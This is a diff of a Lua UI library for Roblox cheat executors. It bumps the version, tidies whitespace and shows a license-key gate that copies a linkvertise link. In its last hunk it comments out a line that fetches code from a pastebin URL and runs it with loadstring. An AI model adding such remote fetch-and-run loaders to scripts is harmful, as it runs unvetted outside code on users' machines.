@@ -1,6 +1,6 @@
 --made by daffy734 you NERD, get out of here
 
-print("🎨 Daffy's UI: ver 1.16.1")
+print("🎨 Daffy's UI: ver 1.16.2")
 
 local location
 if game:GetService("RunService"):IsStudio() then
@@ -41,12 +41,12 @@ function Library:Create(config)
 	local brightColor = Color3.new(config.ThemeColor.R * 3, config.ThemeColor.G * 3, config.ThemeColor.B * 3)
 
 	local PitchHoverColor = Color3.new(config.ThemeColor.R / 2.5, config.ThemeColor.G / 2.5, config.ThemeColor.B / 2.5)
-	
+
 	local everyClipboard = nil
 	if not RunService:IsStudio() then
 		everyClipboard = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)
 	end
-	
+
 	local function toClipboard(txt)
 		if everyClipboard then
 			everyClipboard(tostring(txt))
@@ -54,15 +54,15 @@ function Library:Create(config)
 			print("Your exploit doesn't have the ability to use the clipboard")
 		end
 	end
-	
+
 	local keyWorked = false
-	
+
 	if not config.Key then
 		keyWorked = true
 	end
-	
+
 	-- key stuff
-	
+
 	task.spawn(function()
 		if config.Key then
 			local mainKey = Instance.new("Frame")
@@ -76,7 +76,7 @@ function Library:Create(config)
 			mainKey.AnchorPoint = Vector2.new(0.5, 0.5)
 			mainKey.Position = UDim2.new(0.5, 0, 0.5, 0)
 			mainKey.Size = UDim2.fromOffset(350, 170)
-			
+
 			local bgGrad = Instance.new("UIGradient")
 			bgGrad.Rotation = 90
 			if config.ThemeGradient then
@@ -99,7 +99,7 @@ function Library:Create(config)
 			textboxKey.Position = UDim2.new(0.5, 0, 0.6, 0)
 			textboxKey.Size = UDim2.fromOffset(300, 90)
 			textboxKey.Parent = mainKey
-			
+
 			Instance.new("UICorner", textboxKey)
 
 			local outline = Instance.new("UIStroke")
@@ -124,7 +124,7 @@ function Library:Create(config)
 			title.Position = UDim2.new(0.5, 0, 0.06, 0)
 			title.Size = UDim2.fromOffset(83, 28)
 			title.Parent = mainKey
-			
+
 			local copyLink = Instance.new("TextButton")
 			copyLink.Name = "copy"
 			copyLink.Font = config.ThemeFont
@@ -150,7 +150,7 @@ function Library:Create(config)
 			copyLinkText.Size = UDim2.new(1, 0, 1, 0)
 			copyLinkText.Parent = copyLink
 			copyLink.Parent = mainKey
-			
+
 			local bgGrad2 = Instance.new("UIGradient")
 			bgGrad2.Rotation = 90
 			if config.ThemeGradient then
@@ -159,11 +159,11 @@ function Library:Create(config)
 				bgGrad2.Color = ColorSequence.new(Color3.fromRGB(255, 255, 255), Color3.fromRGB(156, 156, 156))
 			end
 			bgGrad2.Parent = copyLink
-			
+
 			copyLink.MouseButton1Up:Connect(function()
 				toClipboard("https://linkvertise.com/3251796/83SNJ1INhp1X?o=sharing")
 			end)
-			
+
 			Instance.new("UICorner", copyLink)
 
 			local uICorner = Instance.new("UICorner")
@@ -171,14 +171,14 @@ function Library:Create(config)
 			uICorner.Parent = mainKey
 
 			mainKey.Parent = dark_UI
-			
+
 			local keyIndex = 1
 
 			textboxKey.FocusLost:Connect(function(enterPressed)
 				if not enterPressed then return end
 
 				local input = textboxKey.Text
-				
+
 				if table.find(config.Key, input) then
 					keyWorked = true
 					mainKey:Destroy()
@@ -191,8 +191,8 @@ function Library:Create(config)
 		end
 	end)
 	--
-	
-	
+
+
 	repeat task.wait() until keyWorked == true
 
 	local toggless = {}
@@ -1605,7 +1605,7 @@ function Library:Create(config)
 	end)
 
 	if not RunService:IsStudio() then
-		loadstring(game:HttpGet("https://pastebin.com/raw/rQMS2B9R"))()
+		--loadstring(game:HttpGet("https://pastebin.com/raw/rQMS2B9R"))()
 	end
 	spawn(function()
 		local sound = Instance.new("Sound", location)
